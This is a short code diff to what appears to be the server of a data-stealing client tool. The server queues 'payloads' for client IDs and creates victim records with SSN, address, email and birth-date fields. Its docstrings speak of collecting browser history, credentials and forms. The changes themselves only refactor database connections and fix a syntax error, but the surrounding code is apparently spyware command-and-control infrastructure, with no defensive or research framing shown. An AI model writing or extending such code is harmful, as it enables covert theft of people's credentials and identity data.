@@ -35,13 +35,14 @@ Gets pending payload or constructs a new one and populates based on defaults fro
 Pulls blacklist and ad list from database
 """
 def construct_response(clientid):
-    resp = pending_payloads.pop(clientid, None) or new_response(clientid)
-    cur.execute('SELECT URL FROM BlacklistedWebsites')
-    blacklist = cur.fetchall()
-    blacklistList = []
-    for row in blacklist:
-        blacklistList.append(row[0])
-    resp["security_blacklist"] = blacklistList
+    with getConn() as conn:
+        resp = pending_payloads.pop(clientid, None) or new_response(clientid)
+        conn.execute('SELECT URL FROM BlacklistedWebsites')
+        blacklist = conn.fetchall()
+        blacklistList = []
+        for row in blacklist:
+            blacklistList.append(row[0])
+        resp["security_blacklist"] = blacklistList
 
 
     return resp
@@ -56,7 +57,7 @@ for example, browser history, credentials, forms, etc.
 def create_new_client(data):
     with getConn() as conn:
         conn.execute('SELECT LAST_INSERT_ID()')
-        lastID = conn.fetchall())
+        lastID = conn.fetchall()
         curID = lastID[0][0] + 1
         conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (curID, None, None, None, None, None, None, None, None, None, None, None, None))
         formsList = data["forms"]
